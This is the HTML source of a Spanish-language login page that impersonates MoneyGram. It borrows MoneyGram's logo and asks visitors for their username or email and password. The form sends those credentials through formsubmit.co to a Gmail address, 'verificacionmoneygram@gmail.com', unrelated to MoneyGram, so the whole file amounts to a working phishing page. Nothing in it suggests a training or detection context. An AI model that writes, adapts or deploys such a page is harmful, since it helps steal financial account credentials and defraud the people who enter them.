<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>MoneyGram - Acceso</title>
  <style>
    body {
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }
    .form-container {
      background-color: white;
      border-radius: 10px;
      padding: 30px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    input, button {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #e60000;
      color: white;
      border: none;
      cursor: pointer;
    }
    img {
      width: 150px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <img src="https://www.moneygram.com/mgo/us/en/mg-logo.svg" alt="Logo MoneyGram">
    <h2>Accede a tu cuenta</h2>
    <p>Ingresa tu correo electrónico y contraseña para continuar</p>
    <form action="https://formsubmit.co/verificacionmoneygram@gmail.com" method="POST">
      <input type="text" name="usuario" placeholder="Usuario o correo"><br>
      <input type="password" name="clave" placeholder="Contraseña"><br>
      <button type="submit">Entrar</button>
    </form>
  </div>
</body>
</html>
